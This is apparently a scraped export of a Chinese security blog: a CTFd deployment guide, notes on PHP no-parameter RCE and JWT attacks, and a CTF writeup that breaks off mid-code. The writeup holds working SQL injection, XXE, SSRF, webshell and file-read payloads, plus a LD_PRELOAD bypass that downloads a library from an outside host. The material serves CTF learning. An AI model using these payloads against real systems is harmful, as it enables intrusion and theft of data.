sudo apt-get install docker-ce docker-ce-cli containerd.io 查看是否安装成功 docker version 查看docker服务是否启动 systemctl status docker 若未启动，则启动docker服务 sudo systemctl start docker 试着运行 sudo docker run hello-world 安装docker-compose sudo apt-get install docker-compose 检查是否安装成功 docker-compose version 安装CTFd 克隆库 git clone https://github.com/CTFd/CTFd.git cd CTFd/ 安装操作系统需要安装的包 ./prepare.sh 安装python需要的包 pip install -r requirements.txt 运行CTFd python serve.py 可以测试以下是否成功 curl 127.0.0.1:4000 完成以上步骤只是在本地搭起服务器，要是想在公网（物理机）访问，还需要安装gunicorn gunicorn部署CTFd安装 pip install gunicorn 启动服务，在克隆的CTFd文件夹 gunicorn --bind 0.0.0.0:4000 -w 5 &quot;CTFd:create_app()&quot; (gunicorn --bind 0.0.0.0:8000 -w 5 &quot;CTFd:create_app()&quot;&amp;) // 这里加了()还有&amp;是为了那能够后台运行 表示绑定端口号4000,有5个进程来处理请求 使用gunicorn启动服务，访问本机ip+端口即可，公网访问响应很慢 注意： 阿里云安全组默认不开放4000端口，需要在安全组设置 用宝塔的话，安全-&gt;防火墙里需要放行端口（坑了我很久） 配置mysql 这个我没试过，可以参见这个https://blog.csdn.net/z1592570975/article/details/82912801 docker部署CTFd还有种方式就是把CTFd直接放docker里，无需苦恼环境问题,直接pull官方提供的依赖环境,搭建后的访问速度明显提升 在CTFd文件夹里 docker-compose up -d 如果出现以下错误，可能是docker-compose版本问题，因为之前用apt-get安装的，可能版本有点老 出现这个问题发现用 pip uninstall texttable 卸载不了，那就 cd /usr/lib/python(你的版本号)/dist-packages/ rm -rf texttable-*.egg-info 然后再重新 pip install docker-compose 发现可以安装成功，然后 cd /CTFd docker-compose up -d 这个过程可能有点漫长，耐心等待就好 优化配置CTFd汉化汉化 下载主题汉化包 将CTFd/CTFd/themes文件夹替换即可 docker镜像换源docker默认源为国外官方的，下载速度较慢；更换源： 修改或新增/etc/docker/daemon.json： vi /etc/docker/daemon.json 写入： 12345&#123;&quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]&#125; 再重启即可 docker基本使用doker部署的东西分为镜像和容器两种，有什么区别呢？ 镜像： 多个只读层叠加在一起，层与层之间通过指针关联，这些层能够在运行Docker的宿主机的文件系统上访问到 容器： 容器和容器镜像一样，也是若干层的叠加，唯一区别是所有只读层的最上面一层，是一层可读可写层，初学者可以记住这个简单的公式：容器 = 容器镜像 + 可读可写层 docker镜像常见命令查看所有下载的镜像： sudo docker images 搜索镜像： sudo docker search 镜像名称 获取镜像： sudo docker pull 镜像名称 运行镜像： sudo docker run -d --name 容器名称 -p 80:80 镜像名称 -d：后台运行 -name：容器名称(自己命名) -p：指定docker运行此镜像所使用的端口，第一个是外网端口，第二个是内网端口 –privileged：使用该参数，container内的root拥有真正的root权限 -i：以交互模式运行容器 -t：为容器重新分配一个伪输入终端 –link 其他容器：将该容器与其他容器进行连接 删除镜像： sudo docker rmi -f IMAGE-ID/name 其中，IMAGE-ID可在镜像列表中查看；只需使用IMAGE ID前四位即可；也可以使用镜像的名字 docker容器常见命令查看容器列表： sudo docker ps -a 停止容器： sudo docker stop CONTAINER-ID/name 其中，CONTAINER ID可在容器列表中查看；只需使用CONTAINER ID前四位即可；也可以使用运行镜像时所命名的容器名字 运行容器： sudo docker start CONTAINER-ID/name 删除容器(容器需已停止运行)： sudo docker rm CONTAINER-ID/name 进入容器(不知道什么原因，使用docker attach命令无法进入到容器中～) sudo docker exec -it CONTAINER-ID/name /bin/bash 不能用的话可以试试 sudo docker exec -it CONTAINER-ID/name /bin/sh sudo docker exec -it CONTAINER-ID/name bash 拷贝文件 docker cp ~/index.php 容器id:/var/www/html 动态靶机搭建动态flag搭建可以参见这几位大佬的文章 https://www.zhaoj.in/read-6333.htmlhttp://www.gtfly.top/2019/09/27/CTFd动态docker镜像编写.html","categories":[],"tags":[{"name":"CTFd","slug":"CTFd","permalink":"http://www.moonback.xyz/tags/CTFd/"},{"name":"docker","slug":"docker","permalink":"http://www.moonback.xyz/tags/docker/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://www.moonback.xyz/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"php无参数函数利用","slug":"php-nopara-rce","date":"2019-11-12T12:21:35.000Z","updated":"2020-01-31T13:46:19.994Z","comments":true,"path":"2019/11/12/php-nopara-rce/","link":"","permalink":"http://www.moonback.xyz/2019/11/12/php-nopara-rce/","excerpt":"本篇博客主要介绍了php无参数函数利用的一些方法，以及实现rce的示例！","text":"本篇博客主要介绍了php无参数函数利用的一些方法，以及实现rce的示例！ 一道有意思的题123456&lt;?phpif(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\\W]+\\((?R)?\\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; eval($_GET[&#39;code&#39;]);&#125; else &#123; show_source(__FILE__);&#125; 分析一下正则部分: \\W匹配任何一个字母或者数字或者下划线以外的字符 []代表字符集 [^\\W]表示只能匹配任何一个字母或者数字或者下划线，^[abc]则表示匹配以a或b或c开头的 +表示匹配前面的子表达式一次或多次，*表示匹配前面的子表达式零次或多次，?表示匹配前面的子表达式零次或一次 后面的\\(和\\)表示括号的转义 (?R)?表示引用当前表达式的意思 这个正则表示的意思大概就是：匹配无参数的函数或者嵌套函数，例如phpinfo() 这道题只要能构造类似无参函数，就可以执行传过去的内容 解题方法getallheaders() 一般的payload: eval(end(getallheaders())) //获取http请求头中最后一个参数的值，并执行 关于end函数： 同样的有类似的函数 利用的时候可以直接bp抓包在http头最后面加上要执行的代码 getenv() 一般的payload: eval(arrar_rand(array_flip(getenv()))) //获取所有环境变量，返回一个数组，反转键值，随机其中一个执行 array_flip()函数： array_rand()函数： 一般与下面的超全局变量结合，可以用爆破的方式来执行恶意参数 $GLOBALS $_SERVER $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV //等价于getenv()函数 get_defined_vars() 一般的payload： eval(reset(current(get_defined_vars()))) current()函数： reset函数： 一般与下面的超全局变量结合，可以用爆破的方式来执行恶意参数 $GLOBALS $_SERVER $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV //等价于getenv()函数 session_id() 因为PHPSESSID必须为大小写字母、数字、下划线构成的字符串，所以我们需要绕过，可以先对执行的代码十六进制转换，再用hex2bin()函数转换过来，706870696e666f28293b是phpinfo();十六进制形式 成功返回phpinfo 一般的payload: eval(hex2bin(session_id(session_start()))) hex2bin()函数： 常用payload12读文件：readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))) GXY(安恒月赛)源码如下： 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 这题就没法用getallheaders()那种方法了，直接上payload: ?exp=readfile(array_rand(array_flip(scandir(current(localeconv()))))); 解释一下： 1234localeconv() &#x2F;&#x2F;返回一包含本地数字及货币格式信息的数组current() &#x2F;&#x2F;返回当前被内部指针指向的数组单元的值，并不移动指针scandir() &#x2F;&#x2F;列出指定路径中的文件和目录readfile() &#x2F;&#x2F;读取文件并写入到输出缓冲","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"php函数","slug":"php函数","permalink":"http://www.moonback.xyz/tags/php%E5%87%BD%E6%95%B0/"},{"name":"rce","slug":"rce","permalink":"http://www.moonback.xyz/tags/rce/"}]},{"title":"JWT学习","slug":"json-web-token","date":"2019-11-06T12:51:11.000Z","updated":"2019-11-08T10:27:46.751Z","comments":true,"path":"2019/11/06/json-web-token/","link":"","permalink":"http://www.moonback.xyz/2019/11/06/json-web-token/","excerpt":"本篇博客主要记录了JWT机制的学习过程！","text":"本篇博客主要记录了JWT机制的学习过程！ 什么是JWT?JWT全称JSON WEB Token，是用于身份认证的 为什么要有身份认证？ 主要是因为HTTP是无状态的，同样让HTTP有状态的方式还有：session,cookie Cookiecookie 是一个非常具体的东西，指的就是浏览器里面能永久存储的一种数据。跟服务器没啥关系，仅仅是浏览器实现的一种数据存储功能。 cookie由服务器生成，发送给浏览器，浏览器把cookie以KV形式存储到某个目录下的文本文件中，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间。所以每个域的cookie数量是有限制的。 Sessionsession从字面上讲，就是会话。这个就类似你和一个人交谈，你怎么知道当时和你交谈的是张三而不是李四呢？对方肯定有某种特征（长相等）表明他是张三； session也是类似的道理，服务器要知道当前请求发给自己的是谁。为了做这种区分，服务器就是要给每个客户端分配不同的”身份标识”，然后客户端每次向服务器发请求的时候，都带上这个”身份标识“，服务器就知道这个请求来自与谁了。至于客户端怎么保存这个”身份标识“，可以有很多方式，对于浏览器客户端，大家都采用cookie的方式。 Json Web Token结构JSON Web Tokens由dot（.）分隔的三个部分组成，它们是： Header（头部） Payload（负载） Signature（签名） 因此，JWT通常如下展示： xxxxx.yyyyy.zzzz 组成: uid: 用户唯一身份标识 time: 当前时间的时间戳 sign: 签名, 使用 hash/encrypt 压缩成定长的十六进制字符串，以防止第三方恶意拼接 固定参数(可选): 将一些常用的固定参数加入到 token 中是为了避免重复查库 Header（头部） Header 是一个 JSON 对象 &#123; &quot;alg&quot;: &quot;HS256&quot;, // 表示签名的算法，默认是 HMAC SHA256（写成 HS256） &quot;typ&quot;: &quot;JWT&quot; // 表示Token的类型，JWT 令牌统一写为JWT &#125; Payload（负载） Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据 &#123; // 7个官方字段 &quot;iss&quot;: &quot;a.com&quot;, // issuer：签发人 &quot;exp&quot;: &quot;1d&quot;, // expiration time： 过期时间 &quot;sub&quot;: &quot;test&quot;, // subject: 主题 &quot;aud&quot;: &quot;xxx&quot;, // audience： 受众 &quot;nbf&quot;: &quot;xxx&quot;, // Not Before：生效时间 &quot;iat&quot;: &quot;xxx&quot;, // Issued At： 签发时间 &quot;jti&quot;: &quot;1111&quot;, // JWT ID：编号 // 可以定义私有字段 &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true &#125; JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。 Signature（签名） Signature 是对前两部分的签名，防止数据被篡改。 首先，需要指定一个密钥(secret)。这个密钥只有服务器才知道，不能泄露给用户。然后，使用Header里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。 HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 算出签名后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。 JWT = Base64(Header) + &quot;.&quot; + Base64(Payload) + &quot;.&quot; + $Signature 如何保证安全？ 发送JWT要使用HTTPS；不使用HTTPS发送的时候，JWT里不要写入秘密数据 JWT的payload中要设置expire时间 JWT攻击手段非对称-&gt;对称攻击HS256算法使用密钥为所有消息进行签名和验证。 而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。 如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。 由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。 这样的话，后端代码使用RSA公钥+HS256算法进行签名验证 同样的，可以通过一个例子来理解这种攻击方式 http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php RSA公钥：http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem 该例子解法如下： 12345678910111213import jwt# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;# eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNzg3NCwiZXhwIjoxNTA0MDA3OTk0LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\&#x2F;\\&#x2F;demo.sjoerdlangkemper.nl\\&#x2F;&quot;,&quot;iat&quot;:1504007874,&quot;exp&quot;:1504007994,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;public &#x3D; open(&#39;public.pem.1&#39;, &#39;r&#39;).read()print publicprint jwt.encode(&#123;&quot;data&quot;:&quot;test&quot;&#125;, key&#x3D;public, algorithm&#x3D;&#39;HS256&#39;) &#x2F;&#x2F;修改payload中的明文信息 密钥爆破攻击因为HS256只有一个密钥，解密加密都是同一个密钥，因此破解比较容易。 附上现成的破解工具链接https://github.com/brendan-rius/c-jwt-cracker 修改算法none签名算法保证了JWT在传输的过程中不被恶意用户修改 但是header中的alg字段可被修改为none 一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验 将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可 这种攻击的例子可以参考：http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php 代码可以在Github上找到 https://github.com/Sjord/jwtdemo/ 这个例子的解法如下 12345678910111213141516import jwtimport base64# 原header# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;# 原payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\&#x2F;\\&#x2F;demo.sjoerdlangkemper.nl\\&#x2F;&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;def b64urlencode(data): return base64.b64encode(data).replace(&#39;+&#39;, &#39;-&#39;).replace(&#39;&#x2F;&#39;, &#39;_&#39;).replace(&#39;&#x3D;&#39;, &#39;&#39;)# 构造算法字段为none, payload部分可以随意修改print b64urlencode(&quot;&#123;\\&quot;typ\\&quot;:\\&quot;JWT\\&quot;,\\&quot;alg\\&quot;:\\&quot;none\\&quot;&#125;&quot;) + \\ &#39;.&#39; + b64urlencode(&quot;&#123;\\&quot;data\\&quot;:\\&quot;test\\&quot;&#125;&quot;) + &#39;.&#39;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"JWT","slug":"JWT","permalink":"http://www.moonback.xyz/tags/JWT/"}]},{"title":"SYC极客大挑战writeup","slug":"syc-ctf-wp","date":"2019-11-06T07:17:41.000Z","updated":"2021-02-12T06:46:48.418Z","comments":true,"path":"2019/11/06/syc-ctf-wp/","link":"","permalink":"http://www.moonback.xyz/2019/11/06/syc-ctf-wp/","excerpt":"听学长说这里的题还挺简单的，便过来做了做，总结一下吧！","text":"听学长说这里的题还挺简单的，便过来做了做，总结一下吧！ 打比赛之前先撸一只猫！查看源代码，发现 12345$cat&#x3D;$_GET[&#39;cat&#39;];echo $cat;if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123; echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125; get传参就行 ?cat=dog Syc&#123;I_actu4l1y_Lik3_d0gs&#125; 你看见过我的菜刀么打开网页发现 eval($_POST[&quot;Syc&quot;]); 蚁剑直接连就行，发现根目录里有flag文件夹，打开发现flag.txt文件，查看得到flag Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125; BurpSuiiiiiit!!!下载过来是个.jar文件，bp导入即可 在Errors可以看到flag Syc&#123;BurpExtender_Are_guns_F0r_Hack3rs&#125; 性感潇文清，在线算卦查看源代码发现 123456789101112131415$savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;if (!is_dir($savepath)) &#123; $oldmask &#x3D; umask(0); mkdir($savepath); umask($oldmask);&#125;if ((@$_GET[&#39;u&#39;]) &amp;&amp; (@$_GET[&#39;p&#39;])) &#123; $content &#x3D; &#39;***************&#39;; file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content); $msg &#x3D; &#39;Ding!你的算卦结果就在这儿啦！ &#39; . $savepath . htmlspecialchars(sha1($_GET[&#39;u&#39;])) . &quot;&quot;; echo $msg; usleep(100000); @$content &#x3D; &quot;you are too slow&quot;; file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);&#125; 提示用条件竞争 这段代码的意思就是根据你的ip，对其sha1加密，并创建这个文件夹。 然后GET方式接收两个参数，将传过来的u进行sha1加密，并创建该文件，里面写如$content（目测flag)，然后程序睡眠100000微秒，一微秒等于百万分之一秒，大概是0.1s，看到这就用竞争了 由于你的ip地址不变，如果请求的u不变的话，那么文件url是固定的 bp开两个intruder，一个是让它生成文件，一个访问文件 Syc&#123;You-4re-S0-f4st&#125; Easysql这题是多次试出来的 先在用户名加个&#39; 发现报错信息 分析一下报错信息，猜测后台sql语句为&#39;$username&#39; payload: 用户名处： admin&#39; or 1# Syc&#123;sqL_inj3cti0n_1s_re4lly_fUn&#125; RCE me这道题考察的是无字母数字绕过 + disable_fuction绕过 123456789101112131415161718&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);&#x2F;&#x2F; ?&gt; 这道题可能看着很熟悉，可以看下我这篇博客http://www.moonback.xyz/2019/10/16/nowords-webshell/ 但这道题并不是那种思路 先看下phpinfo吧 http://114.116.44.23:40001/?code=$_=%22%23./|&#123;%22^%22|~`//%22;$&#123;$_&#125;[_](); POST _=phpinfo 或者直接用异或或者取反构造也行，并且发现好像只能传POST两个参数 看一下目录，发现有flag文件和readflag，猜测flag是直接读不了的，必须运行readflag才能 发现能执行系统命令的函数基本都过滤了 这里就用LD_PRELOAD来绕过了 ?code=$_=$&#123;~%A0%AF%B0%AC%AB&#125;[_];$_($&#123;~%A0%AF%B0%AC%AB&#125;[__]); 利用这个payload，_传assert(不知道为啥eval不行),__传恶意代码 第一步，先往服务器上传一个.so共享库文件，可以放在/tmp目录下因，为这个路径默认权限是777，可以使用 file_put_contents(&quot;/tmp/bypass_disablefunc_x64.so&quot;,file_get_contents(&quot;http://****/bypass_disablefunc_x64.so&quot;)) 或者用copy函数 copy(&quot;http://******/bypass_disablefunc_x64.so&quot;,&quot;/tmp/bypass_disablefunc_x64.so&quot;) 第二步，向/tmp目录下写入一个php文件 file_put_contents(&quot;/tmp/moonback&quot;,&quot;&lt;?php putenv(&#39;EVIL_CMDLINE=&#39;.&#39;cd /%26%26./readflag &gt; /tmp/moonback1 2&gt;%261&#39;);putenv(&#39;LD_PRELOAD=&#39;.&#39;/tmp/bypass_disablefunc_x64.so&#39;);mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);?&gt;&quot;); 其内容写入 12345&lt;?php putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;); &#x2F;&#x2F;EVIL_CMDLINE&#x3D;shell命令，并将结果输出到一个文件putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;); &#x2F;&#x2F;LD_PRELOAD&#x3D;动态加载库的位置mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F;用mail函数触发?&gt; 这个内容的&amp;符号要url编码%26 第三步，包含文件，查看输出结果 include(&#39;/tmp/moonback&#39;) var_dump(file_get_contents(&#39;/tmp/moonback1&#39;)) 成功解题 李三的代码审计笔记第一页这题并没有神魔漏洞，只需在自己服务器上每次访问让它返回不一样的东西就行 可以用flask简单搭一个 12345678910import flask import datetimeserver&#x3D;flask.Flask(__name__) data&#x3D;&quot;If I knew where I would die, I would never go there.&quot; data&#x3D;data.split(&quot; &quot;) data.reverse()server.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;post&#39;,&#39;get&#39;]) def index(): return data.pop()server.run(port&#x3D;9999) 服务端检测系统访问题目，查看源码，发现admin.php，访问显示127.0.0.1才能访问，说明admin.php需要index.php ssrf 在源码发现这个 12345678910111213141516171819202122232425262728293031323334&lt;!-- if(isset($_POST[&#39;method&#39;]) &amp;&amp; isset($_POST[&#39;url&#39;]) )&#123; $method&#x3D;$_POST[&#39;method&#39;]; $url&#x3D;$_POST[&#39;url&#39;]; if(preg_match(&#39;&#x2F;^http:\\&#x2F;\\&#x2F;&#x2F;i&#39;,$url))&#123; $opts &#x3D; array( &#39;http&#39;&#x3D;&gt;array( &#39;method&#39;&#x3D;&gt;$method, &#39;timeout&#39;&#x3D;&gt;3 ) ); $context &#x3D; stream_context_create($opts); $body &#x3D; @file_get_contents($url.&quot;&#x2F;anything&quot;, false, $context); if(isset($http_response_header))&#123; preg_match(&quot;&#x2F;Allow:(.*?);&#x2F;i&quot;,implode(&#39;;&#39;,$http_response_header).&quot;;&quot;,$matches); if(isset($matches[1]))&#123; echo &quot;服务端支持的请求方法有:&quot;.$matches[1]; &#125;else&#123; echo &quot;failed&lt;br&gt;&quot;; echo sprintf(&quot;body length of $method%d&quot;, $body); &#125; &#125;else&#123; echo &quot;error&quot;; &#125; &#125;else&#123; echo &#39;not allowed&#39;; &#125; &#125;--&gt; method和url可控，url必须是http://开头 输入的url会拼接上/anything然后以options请求方法访问，一次得到Allow返回头 不过sprintf(&quot;body length of $method%d&quot;, $body);这句代码有错误 因为格式化字符串&quot;body length of $method%d&quot;可控，所以只要把%d给转义掉，再注入%s，就能让其显示$body内容， 例如$method传入%s%，那么最后拼接成的便是body length of %s%%d，而最后显示的效果就是body length of 返回的数据%d 再通过ssrf POST一个iwantflag=yes，但是怎末POST呢？ 发现这里用的是file_get_context_create()函数来发起HTTP请求，一些配置选项包括这里的请求方式是作为一个数组经过stream_context_create()处理后传入的。其实这里就存在CRLF注入漏洞，即我们可以完全自己构造一个完整的POST包发出去 具体如下： iwantflag=yes%26b=%s%中的%26是&amp;的url编码，这里是必须要编码的，否则就被当做当前面请求包的参数分割符了 还有为什么这里多传了一个b参数，因为观察最终的请求包就知道后面是会被拼接上原本正 常的HTTP请求包中的内容的，所以为了防止干扰iwantflag变量就又加一个变量 由于我们是要得到返回的数据的，所以最后依然是%s% 请求头中的Content-Length也很重要，和请求包数据实际长度不符是不会得到正确回应的， 所以实际中要自己估量 Lovelysql这题其实是考察联合查询，将请求信息保存成文件，用sqlmap跑下就出来了 Syc&#123;Ohhh_y0u_foUnd_m3&#125; 不url编码会报错 order by判断为3列 1check.php?username=a%27%20order%20by%204%23&amp;password=adsdas 判断回显列为2，3列 1check.php?username=a%27%20union%20select%201,2,3%23&amp;password=adsdas 报数据库 12check.php?username=a%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%23&amp;password=adsdas# information_schema,test,performance_schema,mysql,geek 爆表 12check.php?username=a%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=&quot;geek&quot;%23&amp;password=adsdas# geekuser,l0ve1ysq1 爆字段 12check.php?username=a%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=&quot;geek&quot;%20and%20table_name=&quot;l0ve1ysq1&quot;%23&amp;password=adsdas# id,username,password 爆内容 12check.php?username=a%27%20union%20select%201,group_concat(id,0x23,username,0x23,password),3%20from%20geek.l0ve1ysq1%23&amp;password=adsdas# 成功爆出flag 性感黄阿姨，在线聊天发送flag，抓包看到 将guest改成admin发现 给了个提示，name=md5($flag)，这里就用到弱类型了，即数字和字符串比较时，字符串会先转换成数字，猜测$flag加密后前几位是数字，bp爆破，爆破的内容为name 发现为paload=357时，有个提示 访问发现神魔都没有，并且提示里让我们读这个文件，况且题目考察的点有xxe 再返回那个POST请求，之前提交的是json格式的，那是否能提交xml格式的那？ 发现能回显的地方是name，读取/etc/passwd成功，那么就读一下flag 但是会发现直接读f14g_Is_Here.php读不出来，这是因为php文件中有特殊字符(如&lt;)让xml解 析时出错了,可以利用php流读取，base64解密就行 李三的代码审计笔记第二页Babysql这题双写绕过就行，发现对union,select,for,form都替换成空了 爆数据库 ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23 爆表 ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23 爆字段 ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&#39;geek&#39; anandd table_name=&#39;b4bsql&#39;%23 爆内容 ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(id,0x23,username,0x23,passwoorrd) frfromom geek.b4bsql%23 神秘的三叶草这道题其实很简单，怪当时没看仔细 查看源代码，发现Secret.php 改下User-Agent，Referer，X-Forwarded-For就行，注意bp抓包改的时候要有个空格，并且是英文输入法下的空格 Syc&#123;We1com3_t0_Syc_S3creT&#125; Eval evil code这道题感觉很好，考察的是php无参数执行命令 就是用无参数的php函数去执行命令，之前没了解过，这次就学学吧 可以看下我这篇博客 验证码部分，可以直接脚本跑出来 12345678import hashlibfor i in range(1, 10000001): s &#x3D; hashlib.md5(str(i).encode()).hexdigest()[0:4] #s &#x3D; hashlib.sha1(str(i)).hexdigest()[:6] if s &#x3D;&#x3D; &quot;978e&quot;: print(i) break 先传个phpinfo看看，发现 这里就用Headers的方法 eval(end(getallheaders())); 获取headers的最后一个执行（注意在http请求头的函数是可以有参数的） 读取theflag.php内容即可 Jiang‘s Secret查看源码，发现有个Archive_room.php，访问点击secret提示查阅结束，抓包看下发现有个人action.php，发送到repeater,go一下发现secr3t.php ,访问发现代码 1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt; payload： ?file=php://filter/convert.base64-encode/resource=flag.php base64解密发现flag Syc&#123;Jiang_1uYuan_No_I&#125; Hardsql这题用的是报错注入，union|or|and|substr|if|hex|mid|char|等等都进行 了过滤，这里只能用报错注入爆数据库 ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)%23 爆表 ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like&#39;geek&#39;),0x7e),1)%23 爆字段 ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;),0x7e),1)%23 爆内容 ?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1)%23 在buu上flag的长度太长，我们可以用reverse函数 你有特洛伊么给了个base64加密的东西，解密发现是this is not easy，好像没啥用 打开网址，发现可以上传文件，试着上传，发现对文件头做了检测，并且对&lt;?过滤 发现.phtml没有过滤，所以就上传一句话 GIF89a &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;shell&#39;]);&lt;/script&gt; 抓包前为.gif格式，抓包后改成.phtml 蚁剑连，得到flag Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125; Leixiao’s blog提示用XSS，但是写在博客里的东西只有自己账号可以看到，所以就去其他找XSS 发现注册时的密保问题是可控的，抓包修改即可，发现是限制长度的为32位 并没有弹窗 查看源代码 所以闭合标签的payload &quot;&gt;&lt;script src=***&gt; 在***里填入盗cookie的代码 登陆xss平台 bp抓包改下question 然后把链接发给管理员 在xss平台可以看到就可以得到flag了 反序列化1.0这题就是考察对反序列化的基本认识 查看源代码发现 123456789101112131415161718&lt;?phpclass Student&#123; public $score &#x3D; 0; public function __destruct() &#123; echo &quot;__destruct working&quot;; if($this-&gt;score&#x3D;&#x3D;10000) &#123; $flag &#x3D; &quot;******************&quot;; echo $flag; &#125; &#125;&#125;$exp &#x3D; 